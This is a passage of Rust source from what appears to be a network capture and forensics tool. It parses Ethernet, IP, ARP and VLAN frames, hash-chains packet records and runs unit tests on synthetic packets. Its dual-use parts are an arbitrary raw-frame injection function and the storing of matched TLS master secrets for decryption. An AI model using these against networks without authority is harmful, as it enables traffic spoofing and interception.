            "PORT_LAN_FORWARD".to_string() // 局域网同路由下其他节点间转发
        }
    }
}

/// 以太网帧解析器（完整覆盖 TCP/UDP/ICMP/IPv6/ARP 及全量二层原始帧，100% 结构化填报，拒绝 None 伪代码）
fn parse_ethernet_frame(data: &[u8], last_hash: &mut String) -> Option<PacketRecord> {
    let eth = match EthernetPacket::new(data) {
        Some(e) => e,
        None => {
            // 畸形以太网物理帧全量捕获
            let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
            let ts_ns = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
            let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();
            let mut m = HashMap::new();
            m.insert("status".into(), json!("SHORT_OR_MALFORMED_ETHERNET_FRAME"));
            m.insert("raw_bytes_count".into(), json!(data.len()));
            return Some(PacketRecord {
                id,
                timestamp,
                timestamp_ns: ts_ns,
                direction: "L2_MALFORMED".into(),
                transport: "ETHERNET".into(),
                protocol: "MALFORMED_FRAME".into(),
                src_ip: "00:00:00:00:00:00".into(),
                dst_ip: "FF:FF:FF:FF:FF:FF".into(),
                src_port: 0,
                dst_port: 0,
                length: data.len(),
                payload_hex: hex::encode(data),
                raw_frame_hex: hex::encode(data),
                entropy: ForensicEngine::calculate_entropy(data),
                entropy_level: "suspicious".into(),
                mac_src: "MALFORMED".into(),
                mac_dst: "MALFORMED".into(),
                chain_hash: format!("MALFORMED_{}", id),
                business_data: Some(m),
                raw_text: Some(format!("[MALFORMED FRAME] Short packet (Length: {}B)", data.len())),
            });
        }
    };

    let mac_src = eth.get_source().to_string();
    let mac_dst = eth.get_destination().to_string();
    let raw_frame_hex = hex::encode(data);
    let mac_src_bytes = [
        eth.get_source().0, eth.get_source().1, eth.get_source().2,
        eth.get_source().3, eth.get_source().4, eth.get_source().5,
    ];
    let mac_dst_bytes = [
        eth.get_destination().0, eth.get_destination().1, eth.get_destination().2,
        eth.get_destination().3, eth.get_destination().4, eth.get_destination().5,
    ];
    let src_mac_vendor = crate::protocol_catalog::resolve_mac_vendor(&mac_src_bytes);
    let dst_mac_vendor = crate::protocol_catalog::resolve_mac_vendor(&mac_dst_bytes);
    let ethertype_info = crate::protocol_catalog::lookup_ethertype(eth.get_ethertype().0);

    let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
    let ts_ns = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();

    match eth.get_ethertype() {
        EtherTypes::Ipv4 => {
            let (src_ip, dst_ip, l4_info, ip_total_len, ttl) = match Ipv4Packet::new(eth.payload()) {
                Some(ipv4) => {
                    let s_ip = ipv4.get_source().to_string();
                    let d_ip = ipv4.get_destination().to_string();
                    let t_len = ipv4.get_total_length() as usize;
                    let proto = ipv4.get_next_level_protocol();
                    let ttl_val = ipv4.get_ttl();
                    let hdr_len = (ipv4.get_header_length() as usize) * 4;
                    let l4_payload = eth.payload().get(hdr_len..).unwrap_or(&[]);
                    let info = extract_l4(proto, l4_payload);
                    (s_ip, d_ip, info, t_len, ttl_val)
                }
                None => {
                    let mut m = HashMap::new();
                    m.insert("status".into(), json!("TRUNCATED_IPV4_HEADER"));
                    let info = L4Info {
                        transport: "IPV4_RAW".into(),
                        src_port: 0,
                        dst_port: 0,
                        payload: eth.payload(),
                        protocol_desc: "IPV4_TRUNCATED".into(),
                        control_data: m,
                        summary_text: "[TRUNCATED IPV4 PACKET]".into(),
                    };
                    ("0.0.0.0".into(), "0.0.0.0".into(), info, eth.payload().len(), 0)
                }
            };

            let mut b_map = l4_info.control_data;
            b_map.insert("ttl".into(), json!(ttl));
            if let Some(ref v) = src_mac_vendor {
                b_map.insert("src_mac_vendor_cn".into(), json!(v.vendor_cn));
                b_map.insert("src_mac_vendor_en".into(), json!(v.vendor_en));
                b_map.insert("src_device_cat".into(), json!(v.device_category));
            }
            if let Some(ref v) = dst_mac_vendor {
                b_map.insert("dst_mac_vendor_cn".into(), json!(v.vendor_cn));
                b_map.insert("dst_mac_vendor_en".into(), json!(v.vendor_en));
                b_map.insert("dst_device_cat".into(), json!(v.device_category));
            }
            if let Some(ref e) = ethertype_info {
                b_map.insert("ethertype_name".into(), json!(e.name));
                b_map.insert("ethertype_desc".into(), json!(e.description));
                b_map.insert("is_industrial_l2".into(), json!(e.is_industrial));
            }
            let (protocol, entropy, entropy_level, payload_hex, raw_text) = if !l4_info.payload.is_empty() {
                let ent = ForensicEngine::calculate_entropy(l4_info.payload);
                let ent_lvl = classify_entropy(ent);
                let hex_s = hex::encode(l4_info.payload);
                let proto = dpi::identify_protocol(l4_info.src_port, l4_info.dst_port, l4_info.payload);
                let app_map = dpi::dissect_payload(&proto, l4_info.payload);
                b_map.extend(app_map);
                let raw = generate_raw_text_preview(l4_info.payload);
                (proto, ent, ent_lvl, hex_s, raw)
            } else {
                let ent = 0.0;
                let ent_lvl = "safe".to_string();
                let proto = if !l4_info.protocol_desc.is_empty() {
                    l4_info.protocol_desc
                } else {
                    dpi::identify_protocol(l4_info.src_port, l4_info.dst_port, &[])
                };
                let raw = l4_info.summary_text;
                (proto, ent, ent_lvl, String::new(), raw)
            };

            // 统一全局链式哈希（单一司法证据链，跨引擎连续）
            let chain_hash = advance_global_chain(
                ts_ns,
                &format!("{}:{}->{}:{}|{}|{}", src_ip, l4_info.src_port, dst_ip, l4_info.dst_port, l4_info.transport, payload_hex),
            );
            *last_hash = chain_hash.clone();

            let length = if !l4_info.payload.is_empty() {
                l4_info.payload.len()
            } else {
                ip_total_len
            };

            // 握手碎片自适应重组与密钥环自动匹配 (对标 mitmproxy / Wireshark TLS)
            if l4_info.transport == "TCP" && !l4_info.payload.is_empty() {
                let flow_key = crate::tls_keyring::TcpFlowKey {
                    src_ip: src_ip.clone(),
                    src_port: l4_info.src_port,
                    dst_ip: dst_ip.clone(),
                    dst_port: l4_info.dst_port,
                };
                if let Some(hs) = crate::tls_keyring::GLOBAL_HANDSHAKE_REASSEMBLER.feed_segment(&flow_key, l4_info.payload) {
                    if let Some(ref cr) = hs.client_random {
                        b_map.insert("tls_client_random".into(), json!(cr));
                        if let Some(sec) = crate::tls_keyring::GLOBAL_KEYRING_CACHE.lookup_secrets(cr) {
                            b_map.insert("tls_keyring_matched".into(), json!(true));
                            if let Some(ref ms) = sec.master_secret {
                                b_map.insert("tls_master_secret".into(), json!(ms));
                            }
                        }
                    }
                    if hs.is_gm_ssl {
                        b_map.insert("is_gm_ssl".into(), json!(true));
                        b_map.insert("gm_ssl_version".into(), json!("GM/T 0024-2014"));
                        if let Some(ref sn) = hs.cipher_suite_name {
                            b_map.insert("gm_cipher_suite".into(), json!(sn));
                        }
                    }
                }
            }
            let direction = classify_network_direction(&src_ip, &dst_ip);

            Some(PacketRecord {
                id,
                timestamp,
                timestamp_ns: ts_ns,
                direction,
                transport: l4_info.transport,
                protocol,
                src_ip,
                dst_ip,
                src_port: l4_info.src_port,
                dst_port: l4_info.dst_port,
                length,
                payload_hex,
                raw_frame_hex,
                entropy,
                entropy_level,
                mac_src,
                mac_dst,
                chain_hash,
                business_data: Some(b_map),
                raw_text: Some(raw_text),
            })
        }
        EtherTypes::Arp => {
            let arp_opt = ArpPacket::new(eth.payload());
            let (sender_ip, target_ip, sender_mac, target_mac, op_str, b_map) = match arp_opt {
                Some(arp) => {
                    let op = match arp.get_operation().0 {
                        1 => "REQUEST (1)",
                        2 => "REPLY (2)",
                        3 => "RARP_REQUEST (3)",
                        4 => "RARP_REPLY (4)",
                        other => &format!("OP_{}", other),
                    };
                    let mut m = HashMap::new();
                    m.insert("arp_operation".into(), json!(op));
                    m.insert("sender_mac".into(), json!(arp.get_sender_hw_addr().to_string()));
                    m.insert("sender_ip".into(), json!(arp.get_sender_proto_addr().to_string()));
                    m.insert("target_mac".into(), json!(arp.get_target_hw_addr().to_string()));
                    m.insert("target_ip".into(), json!(arp.get_target_proto_addr().to_string()));
                    m.insert("hardware_type".into(), json!("Ethernet (1)"));
                    m.insert("protocol_type".into(), json!("IPv4 (0x0800)"));
                    (
                        arp.get_sender_proto_addr().to_string(),
                        arp.get_target_proto_addr().to_string(),
                        arp.get_sender_hw_addr().to_string(),
                        arp.get_target_hw_addr().to_string(),
                        op.to_string(),
                        m
                    )
                }
                None => {
                    let mut m = HashMap::new();
                    m.insert("status".into(), json!("TRUNCATED_ARP_FRAME"));
                    (
                        "0.0.0.0".into(), "0.0.0.0".into(),
                        mac_src.clone(), mac_dst.clone(),
                        "UNKNOWN".into(),
                        m
                    )
                }
            };

            let summary_text = if op_str.contains("REQUEST") {
                format!("ARP Who has {}? Tell {}", target_ip, sender_ip)
            } else if op_str.contains("REPLY") {
                format!("ARP {} is at {}", sender_ip, sender_mac)
            } else {
                format!("ARP {} -> {}", sender_ip, target_ip)
            };

            let payload_bytes = data.to_vec();
            let entropy = ForensicEngine::calculate_entropy(&payload_bytes);
            Some(PacketRecord {
                id,
                timestamp,
                timestamp_ns: ts_ns,
                direction: "L2_ARP".into(),
                transport: "ARP".into(),
                protocol: "ARP".into(),
                src_ip: sender_ip,
                dst_ip: target_ip,
                src_port: 0,
                dst_port: 0,
                length: payload_bytes.len(),
                payload_hex: hex::encode(&payload_bytes),
                raw_frame_hex,
                entropy,
                entropy_level: classify_entropy(entropy),
                mac_src: sender_mac,
                mac_dst: target_mac,
                chain_hash: "ARP".into(),
                business_data: Some(b_map),
                raw_text: Some(summary_text),
            })
        }
        EtherTypes::Ipv6 => {
            let (src_ip, dst_ip, l4_info, ip_total_len, hop_limit) = match Ipv6Packet::new(eth.payload()) {
                Some(ipv6) => {
                    let s_ip = ipv6.get_source().to_string();
                    let d_ip = ipv6.get_destination().to_string();
                    let t_len = (ipv6.get_payload_length() as usize) + 40;
                    let proto = ipv6.get_next_header();
                    let hl = ipv6.get_hop_limit();
                    let l4_payload = eth.payload().get(40..).unwrap_or(&[]);
                    let info = extract_l4(proto, l4_payload);
                    (s_ip, d_ip, info, t_len, hl)
                }
                None => {
                    let mut m = HashMap::new();
                    m.insert("status".into(), json!("TRUNCATED_IPV6_HEADER"));
                    let info = L4Info {
                        transport: "IPV6_RAW".into(),
                        src_port: 0,
                        dst_port: 0,
                        payload: eth.payload(),
                        protocol_desc: "IPV6_TRUNCATED".into(),
                        control_data: m,
                        summary_text: "[TRUNCATED IPV6 PACKET]".into(),
                    };
                    ("::".into(), "::".into(), info, eth.payload().len(), 0)
                }
            };

            let mut b_map = l4_info.control_data;
            b_map.insert("ttl".into(), json!(hop_limit));
            let (protocol, entropy, entropy_level, payload_hex, raw_text) = if !l4_info.payload.is_empty() {
                let ent = ForensicEngine::calculate_entropy(l4_info.payload);
                let ent_lvl = classify_entropy(ent);
                let hex_s = hex::encode(l4_info.payload);
                let proto = dpi::identify_protocol(l4_info.src_port, l4_info.dst_port, l4_info.payload);
                let app_map = dpi::dissect_payload(&proto, l4_info.payload);
                b_map.extend(app_map);
                let raw = generate_raw_text_preview(l4_info.payload);
                (proto, ent, ent_lvl, hex_s, raw)
            } else {
                let ent = 0.0;
                let ent_lvl = "safe".to_string();
                let proto = if !l4_info.protocol_desc.is_empty() {
                    l4_info.protocol_desc
                } else {
                    dpi::identify_protocol(l4_info.src_port, l4_info.dst_port, &[])
                };
                let raw = l4_info.summary_text;
                (proto, ent, ent_lvl, String::new(), raw)
            };

            // 统一全局链式哈希（单一司法证据链，跨引擎连续）
            let chain_hash = advance_global_chain(
                ts_ns,
                &format!("{}:{}->{}:{}|{}|{}", src_ip, l4_info.src_port, dst_ip, l4_info.dst_port, l4_info.transport, payload_hex),
            );
            *last_hash = chain_hash.clone();

            let length = if !l4_info.payload.is_empty() {
                l4_info.payload.len()
            } else {
                ip_total_len
            };

            let direction = classify_network_direction(&src_ip, &dst_ip);

            Some(PacketRecord {
                id,
                timestamp,
                timestamp_ns: ts_ns,
                direction,
                transport: l4_info.transport,
                protocol,
                src_ip,
                dst_ip,
                src_port: l4_info.src_port,
                dst_port: l4_info.dst_port,
                length,
                payload_hex,
                raw_frame_hex,
                entropy,
                entropy_level,
                mac_src,
                mac_dst,
                chain_hash,
                business_data: Some(b_map),
                raw_text: Some(raw_text),
            })
        }
        other_eth => {
            let payload_bytes = eth.payload();
            let entropy = ForensicEngine::calculate_entropy(payload_bytes);
            let mut b_map = HashMap::new();

            // IEEE 802.1Q / 802.1ad QinQ VLAN 深度剥离与遥测分析
            let (proto_name, is_vlan_frame) = if crate::vlan_monitor::is_vlan_ethertype(other_eth.0) {
                let stripped = crate::vlan_monitor::strip_vlan_tags(other_eth.0, payload_bytes);
                crate::vlan_monitor::record_vlan_packet(
                    &stripped.tags,
                    data.len(),
                    &mac_src,
                    stripped.has_vlan_hopping_threat,
                    &timestamp,
                );

                b_map.insert("is_vlan".into(), json!(true));
                b_map.insert("is_qinq".into(), json!(stripped.is_double_tagged));
                b_map.insert("vlan_tags".into(), json!(stripped.tags));
                if let Some(first) = stripped.tags.first() {
                    b_map.insert("vlan_vid".into(), json!(first.vid));
                    b_map.insert("vlan_pcp".into(), json!(first.pcp));
                    b_map.insert("vlan_priority_desc".into(), json!(&first.priority_desc));
                }
                if stripped.has_vlan_hopping_threat {
                    b_map.insert("vlan_threat_alert".into(), json!(&stripped.threat_summary));
                }

                let p_name = if stripped.is_double_tagged {
                    "QinQ_802.1ad".to_string()
                } else {
                    "VLAN_802.1Q".to_string()
                };
                (p_name, true)
            } else {
                let p_name = match other_eth.0 {
                    0x88CC => "LLDP".into(),
                    0x8847 => "MPLS_UNICAST".into(),
                    0x8864 => "PPPoE_SESSION".into(),
                    0x888E => "EAPOL_802.1X".into(),
                    0x88F7 => "PTP_IEEE1588".into(),
                    0x88E5 => "MACsec_802.1AE".into(),
                    0x8906 => "FCoE".into(),
                    other => format!("ETH_0x{:04X}", other),
                };
                (p_name, false)
            };

            b_map.insert("ether_type".into(), json!(format!("0x{:04X}", other_eth.0)));
            b_map.insert("protocol_name".into(), json!(&proto_name));
            b_map.insert("frame_length_bytes".into(), json!(data.len()));
            b_map.insert("payload_length_bytes".into(), json!(payload_bytes.len()));
            b_map.insert("source_mac".into(), json!(&mac_src));
            b_map.insert("destination_mac".into(), json!(&mac_dst));

            let summary_text = if is_vlan_frame {
                format!(
                    "VLAN Encapsulated Frame [{}] {} -> {} (Length: {}B)",
                    proto_name, mac_src, mac_dst, data.len()
                )
            } else {
                format!(
                    "Ethernet Frame [{}] {} -> {} (Length: {}B)",
                    proto_name, mac_src, mac_dst, data.len()
                )
            };

            let payload_hex = hex::encode(payload_bytes);
            // 统一全局链式哈希（单一司法证据链）
            let chain_hash = advance_global_chain(
                ts_ns,
                &format!("{}->{}|{}|{}", mac_src, mac_dst, proto_name, payload_hex),
            );
            *last_hash = chain_hash.clone();

            Some(PacketRecord {
                id,
                timestamp,
                timestamp_ns: ts_ns,
                direction: "L2_RAW".into(),
                transport: "ETHERNET".into(),
                protocol: proto_name,
                src_ip: mac_src.clone(),
                dst_ip: mac_dst.clone(),
                src_port: 0,
                dst_port: 0,
                length: data.len(),
                payload_hex,
                raw_frame_hex,
                entropy,
                entropy_level: classify_entropy(entropy),
                mac_src,
                mac_dst,
                chain_hash,
                business_data: Some(b_map),
                raw_text: Some(summary_text),
            })
        }
    }
}

/// 针对 Windows 原生 Raw Socket (SIO_RCVALL) 捕获的纯 IPv4 报文解析器
pub fn parse_ipv4_raw_packet(data: &[u8], last_hash: &mut String) -> Option<PacketRecord> {
    let ipv4 = match Ipv4Packet::new(data) {
        Some(ip) if ip.get_version() == 4 => ip,
        _ => return None,
    };

    let src_ip = ipv4.get_source().to_string();
    let dst_ip = ipv4.get_destination().to_string();
    let total_len = ipv4.get_total_length() as usize;
    let proto = ipv4.get_next_level_protocol();
    let ttl = ipv4.get_ttl();
    let hdr_len = (ipv4.get_header_length() as usize) * 4;
    let l4_payload = data.get(hdr_len..).unwrap_or(&[]);
    let l4_info = extract_l4(proto, l4_payload);

    let id = PACKET_COUNTER.fetch_add(1, Ordering::Relaxed);
    let ts_ns = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let timestamp = chrono::Local::now().format("%H:%M:%S.%3f").to_string();

    let mut b_map = l4_info.control_data;
    b_map.insert("ttl".into(), json!(ttl));
    let (protocol, entropy, entropy_level, payload_hex, raw_text) = if !l4_info.payload.is_empty() {
        let ent = ForensicEngine::calculate_entropy(l4_info.payload);
        let ent_lvl = classify_entropy(ent);
        let hex_s = hex::encode(l4_info.payload);
        let proto = dpi::identify_protocol(l4_info.src_port, l4_info.dst_port, l4_info.payload);
        let app_map = dpi::dissect_payload(&proto, l4_info.payload);
        b_map.extend(app_map);
        let raw = generate_raw_text_preview(l4_info.payload);
        (proto, ent, ent_lvl, hex_s, raw)
    } else {
        let ent = 0.0;
        let ent_lvl = "safe".to_string();
        let proto = if !l4_info.protocol_desc.is_empty() {
            l4_info.protocol_desc
        } else {
            dpi::identify_protocol(l4_info.src_port, l4_info.dst_port, &[])
        };
        let raw = l4_info.summary_text;
        (proto, ent, ent_lvl, String::new(), raw)
    };

    // 统一全局链式哈希（废除 raw socket 独立链 RAW_SOCKET_GENESIS，并入单一司法证据链）
    let chain_hash = advance_global_chain(
        ts_ns,
        &format!("{}:{}->{}:{}|{}|{}", src_ip, l4_info.src_port, dst_ip, l4_info.dst_port, l4_info.transport, payload_hex),
    );
    *last_hash = chain_hash.clone();

    let length = if !l4_info.payload.is_empty() {
        l4_info.payload.len()
    } else {
        total_len
    };

    let direction = classify_network_direction(&src_ip, &dst_ip);

    Some(PacketRecord {
        id,
        timestamp,
        timestamp_ns: ts_ns,
        direction,
        transport: l4_info.transport,
        protocol,
        src_ip,
        dst_ip,
        src_port: l4_info.src_port,
        dst_port: l4_info.dst_port,
        length,
        payload_hex,
        raw_frame_hex: hex::encode(data),
        entropy,
        entropy_level,
        mac_src: "N/A(RAW_IP)".into(),
        mac_dst: "N/A(RAW_IP)".into(),
        chain_hash,
        business_data: Some(b_map),
        raw_text: Some(raw_text),
    })
}

/// pub：熵值分级供 active_probe.rs 等模块复用统一阈值
pub fn classify_entropy(e: f64) -> String {
    if e >= 7.5 {
        "critical".into()
    } else if e >= 6.0 {
        "suspicious".into()
    } else {
        "safe".into()
    }
}

/// 原始报文注入接口
pub fn inject_packet(raw_hex: &str, iface: &str) -> Result<String, String> {
    let bytes =
        hex::decode(raw_hex.replace(' ', "")).map_err(|e| format!("HEX解码失败: {}", e))?;

    // auto/空接口：实时枚举设备并回退到第一个非回环物理网卡（杜绝硬编码 GUID）
    let device_name = if iface.is_empty() || iface == "auto" {
        let devs = safe_list_devices(Duration::from_secs(5))
            .map_err(|e| format!("[INJECT] ❌ 网卡枚举失败，无法确定注入设备: {}", e))?;
        devs.iter()
            .find(|d| {
                !d.name.contains("Loopback")
                    && !d.desc
                        .clone()
                        .unwrap_or_default()
                        .to_lowercase()
                        .contains("loopback")
            })
            .map(|d| d.name.clone())
            .ok_or_else(|| {
                "[INJECT] ❌ 未找到任何可用的非回环网卡设备，请在设置中显式指定注入接口".to_string()
            })?
    } else {
        iface.split(" - ").next().unwrap_or(iface).trim().to_string()
    };

    let dev = Device {
        name: device_name,
        desc: None,
        addresses: vec![],
        flags: DeviceFlags::empty(),
    };

    let mut cap = Capture::from_device(dev)
        .map_err(|e| e.to_string())?
        .open()
        .map_err(|e| e.to_string())?;

    let len = bytes.len();
    cap.sendpacket(bytes.as_slice())
        .map(|_| format!("[INJECT] ✅ 数据帧注入成功！共 {} 字节", len))
        .map_err(|e| format!("[INJECT] ❌ 注入失败: {}", e))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_list_network_interfaces_never_hangs() {
        let start = Instant::now();
        let ifaces = list_network_interfaces().expect("Should return interfaces");
        let elapsed = start.elapsed();
        println!("Interfaces listed in {:?}: {:?}", elapsed, ifaces);
        assert!(!ifaces.is_empty(), "Interface list must never be empty");
        assert!(elapsed < Duration::from_secs(5), "Listing interfaces must not exceed 5s");

        let start2 = Instant::now();
        match safe_list_devices(Duration::from_secs(3)) {
            Ok(devs) => println!("safe_list_devices returned {} devs in {:?}", devs.len(), start2.elapsed()),
            Err(e) => println!("safe_list_devices error in {:?}: {}", start2.elapsed(), e),
        }
    }

    #[test]
    fn test_parse_ethernet_tcp_syn_packet() {
        use pnet::packet::ethernet::MutableEthernetPacket;
        use pnet::packet::ipv4::MutableIpv4Packet;
        use pnet::packet::tcp::MutableTcpPacket;

        let mut frame = vec![0u8; 14 + 20 + 20];
        {
            let mut eth = MutableEthernetPacket::new(&mut frame).unwrap();
            eth.set_destination(pnet::util::MacAddr::new(0x00, 0x11, 0x22, 0x33, 0x44, 0x55));
            eth.set_source(pnet::util::MacAddr::new(0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB));
            eth.set_ethertype(EtherTypes::Ipv4);
        }
        {
            let mut ip = MutableIpv4Packet::new(&mut frame[14..]).unwrap();
            ip.set_version(4);
            ip.set_header_length(5);
            ip.set_total_length(40);
            ip.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocols::Tcp);
            ip.set_source(std::net::Ipv4Addr::new(192, 168, 1, 100));
            ip.set_destination(std::net::Ipv4Addr::new(192, 168, 1, 1));
        }
        {
            let mut tcp = MutableTcpPacket::new(&mut frame[34..]).unwrap();
            tcp.set_source(54321);
            tcp.set_destination(80);
            tcp.set_data_offset(5);
            tcp.set_flags(0x02); // SYN
        }

        let mut last_hash = "GENESIS".to_string();
        let record_opt = parse_ethernet_frame(&frame, &mut last_hash);
        assert!(record_opt.is_some());
        let rec = record_opt.unwrap();
        assert_eq!(rec.src_ip, "192.168.1.100");
        assert_eq!(rec.dst_ip, "192.168.1.1");
        assert_eq!(rec.src_port, 54321);
        assert_eq!(rec.dst_port, 80);
        assert_eq!(rec.protocol, "TCP_SYN");
        assert_eq!(rec.length, 40);
        assert!(rec.business_data.is_some(), "TCP 控制帧必须输出完整结构化业务字段，绝不能为 None！");
        assert!(rec.raw_text.is_some(), "TCP 控制帧必须输出可读摘要，绝不能为 None！");
    }

    #[test]
    fn test_parse_ethernet_ipv6_packet() {
        use pnet::packet::ethernet::MutableEthernetPacket;
        use pnet::packet::ipv6::MutableIpv6Packet;
        use pnet::packet::tcp::MutableTcpPacket;

        let mut frame = vec![0u8; 14 + 40 + 20];
        {
            let mut eth = MutableEthernetPacket::new(&mut frame).unwrap();
            eth.set_destination(pnet::util::MacAddr::new(0x00, 0x11, 0x22, 0x33, 0x44, 0x55));
            eth.set_source(pnet::util::MacAddr::new(0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB));
            eth.set_ethertype(EtherTypes::Ipv6);
        }
        {
            let mut ip6 = MutableIpv6Packet::new(&mut frame[14..]).unwrap();
            ip6.set_version(6);
            ip6.set_payload_length(20);
            ip6.set_next_header(pnet::packet::ip::IpNextHeaderProtocols::Tcp);
            ip6.set_source("2001:db8::1".parse().unwrap());
            ip6.set_destination("2001:db8::2".parse().unwrap());
        }
        {
            let mut tcp = MutableTcpPacket::new(&mut frame[54..]).unwrap();
            tcp.set_source(443);
            tcp.set_destination(51234);
            tcp.set_data_offset(5);
            tcp.set_flags(0x12); // SYN + ACK
        }

        let mut last_hash = "GENESIS".to_string();
        let record_opt = parse_ethernet_frame(&frame, &mut last_hash);
        assert!(record_opt.is_some());
        let rec = record_opt.unwrap();
        assert_eq!(rec.src_ip, "2001:db8::1");
        assert_eq!(rec.dst_ip, "2001:db8::2");
        assert_eq!(rec.src_port, 443);
        assert_eq!(rec.dst_port, 51234);
        assert_eq!(rec.protocol, "TCP_SYN_ACK");
        assert!(rec.business_data.is_some());
        assert!(rec.raw_text.is_some());
    }

    #[test]
    fn test_parse_ethernet_raw_fallback() {
        use pnet::packet::ethernet::MutableEthernetPacket;
        let mut frame = vec![0u8; 32];
        {
            let mut eth = MutableEthernetPacket::new(&mut frame).unwrap();
            eth.set_destination(pnet::util::MacAddr::new(0x01, 0x80, 0xC2, 0x00, 0x00, 0x0E));
            eth.set_source(pnet::util::MacAddr::new(0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB));
            eth.set_ethertype(pnet::packet::ethernet::EtherType(0x88CC));
        }
        let mut last_hash = "GENESIS".to_string();
        let record_opt = parse_ethernet_frame(&frame, &mut last_hash);
        assert!(record_opt.is_some());
        let rec = record_opt.unwrap();
        assert_eq!(rec.transport, "ETHERNET");
        assert_eq!(rec.protocol, "LLDP");
        assert!(rec.business_data.is_some());
        assert!(rec.raw_text.is_some());
    }

    #[test]
    fn test_parse_arp_structure() {
        use pnet::packet::arp::MutableArpPacket;
        use pnet::packet::ethernet::MutableEthernetPacket;

        let mut frame = vec![0u8; 14 + 28];
        {
            let mut eth = MutableEthernetPacket::new(&mut frame).unwrap();
            eth.set_destination(pnet::util::MacAddr::broadcast());
            eth.set_source(pnet::util::MacAddr::new(0x00, 0x11, 0x22, 0x33, 0x44, 0x55));
            eth.set_ethertype(EtherTypes::Arp);
        }
        {
            let mut arp = MutableArpPacket::new(&mut frame[14..]).unwrap();
            arp.set_hardware_type(pnet::packet::arp::ArpHardwareTypes::Ethernet);
            arp.set_protocol_type(EtherTypes::Ipv4);
            arp.set_hw_addr_len(6);
            arp.set_proto_addr_len(4);
            arp.set_operation(pnet::packet::arp::ArpOperations::Request);
            arp.set_sender_hw_addr(pnet::util::MacAddr::new(0x00, 0x11, 0x22, 0x33, 0x44, 0x55));
            arp.set_sender_proto_addr(std::net::Ipv4Addr::new(192, 168, 1, 100));
            arp.set_target_hw_addr(pnet::util::MacAddr::zero());
            arp.set_target_proto_addr(std::net::Ipv4Addr::new(192, 168, 1, 1));
        }

        let mut last_hash = "GENESIS".to_string();
        let record_opt = parse_ethernet_frame(&frame, &mut last_hash);
        assert!(record_opt.is_some());
        let rec = record_opt.unwrap();
        assert_eq!(rec.protocol, "ARP");
        assert!(rec.business_data.is_some());
        assert!(rec.raw_text.is_some());
        let text = rec.raw_text.unwrap();
        assert!(text.contains("192.168.1.1"));
    }

    #[test]
    fn test_parse_ipv4_raw_packet_and_sl651() {
        use pnet::packet::ipv4::MutableIpv4Packet;
        use pnet::packet::udp::MutableUdpPacket;

        let sl651_payload = vec![
            0x7E, 0x7E,       // 帧头
            0x01,             // 中心站地址
            0x12, 0x34, 0x56, 0x78, 0x90, // 测站地址 BCD
            0x00, 0x00,       // 密码
            0x2F,             // 功能码: 链路维持心跳
            0x00, 0x10,       // 长度
            0xAA, 0xBB,       // CRC
        ];

        let total_len = 20 + 8 + sl651_payload.len();
        let mut raw_packet = vec![0u8; total_len];
        {
            let mut ip = MutableIpv4Packet::new(&mut raw_packet[..]).unwrap();
            ip.set_version(4);
            ip.set_header_length(5);
            ip.set_total_length(total_len as u16);
            ip.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocols::Udp);
            ip.set_source(std::net::Ipv4Addr::new(192, 168, 1, 35));
            ip.set_destination(std::net::Ipv4Addr::new(192, 168, 1, 114));
        }
        {
            let mut udp = MutableUdpPacket::new(&mut raw_packet[20..]).unwrap();
            udp.set_source(5003);
            udp.set_destination(5003);
            udp.set_length((8 + sl651_payload.len()) as u16);
        }
        raw_packet[28..].copy_from_slice(&sl651_payload);

        let mut last_hash = "GENESIS".to_string();
        let record_opt = parse_ipv4_raw_packet(&raw_packet, &mut last_hash);
        assert!(record_opt.is_some());
        let rec = record_opt.unwrap();
        assert_eq!(rec.src_ip, "192.168.1.35");
        assert_eq!(rec.dst_ip, "192.168.1.114");
        assert_eq!(rec.src_port, 5003);
        assert_eq!(rec.dst_port, 5003);
        assert_eq!(rec.protocol, "SL651_WATER");
        assert!(rec.business_data.is_some());
        let b = rec.business_data.unwrap();
        assert_eq!(b.get("telemetry_station_bcd").unwrap().as_str().unwrap(), "1234567890");
        assert_eq!(b.get("function_code").unwrap().as_str().unwrap(), "0x2F");
        assert_eq!(b.get("function_name").unwrap().as_str().unwrap(), "链路维持报 (心跳)");
    }

    #[test]
    fn test_raw_socket_extreme_corrupted_packets() {
        let mut last_hash = "GENESIS".to_string();

        // 1. 极限用例: 0 字节空载荷
        assert!(parse_ipv4_raw_packet(&[], &mut last_hash).is_none());

        // 2. 极限用例: 截断小于 20 字节（不足最小 IPv4 报头）
        let truncated = vec![0x45, 0x00, 0x00, 0x14, 0x00, 0x01];
        assert!(parse_ipv4_raw_packet(&truncated, &mut last_hash).is_none());

        // 3. 极限用例: 版本号非 4 的伪造畸形包 (IPv6 版本标识伪装)
        let mut fake_v6 = vec![0u8; 40];
        fake_v6[0] = 0x60; // Version 6
        assert!(parse_ipv4_raw_packet(&fake_v6, &mut last_hash).is_none());
    }

    #[test]
    fn test_raw_socket_unknown_l4_protocol_fallback() {
        use pnet::packet::ipv4::MutableIpv4Packet;

        let total_len = 20 + 16;
        let mut raw_packet = vec![0u8; total_len];
        {
            let mut ip = MutableIpv4Packet::new(&mut raw_packet[..]).unwrap();
            ip.set_version(4);
            ip.set_header_length(5);
            ip.set_total_length(total_len as u16);
            ip.set_next_level_protocol(pnet::packet::ip::IpNextHeaderProtocol(99)); // 未知私有协议号 99
            ip.set_source(std::net::Ipv4Addr::new(10, 0, 0, 1));
            ip.set_destination(std::net::Ipv4Addr::new(10, 0, 0, 2));
        }
        // 载荷填充
        raw_packet[20..].copy_from_slice(&[0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C]);

        let mut last_hash = "GENESIS".to_string();
        let rec = parse_ipv4_raw_packet(&raw_packet, &mut last_hash);
